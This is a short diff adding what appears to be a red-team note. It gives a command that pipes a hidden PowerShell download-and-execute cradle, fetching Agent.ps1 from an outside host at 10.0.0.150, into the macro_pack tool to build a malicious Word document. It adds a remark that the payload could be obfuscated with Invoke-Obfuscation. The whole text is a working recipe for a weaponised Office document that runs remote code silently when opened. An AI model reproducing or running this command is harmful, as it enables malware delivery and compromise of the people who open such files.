@@ -1,0 +1,3 @@
+echo "powershell.exe -windowstyle Hidden -c IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') -WindowStyle Hidden" | macro_pack.exe -t CMD -o -G  cmd.doc
+
+could be ofuscated with powershell Invoke_obfuscation
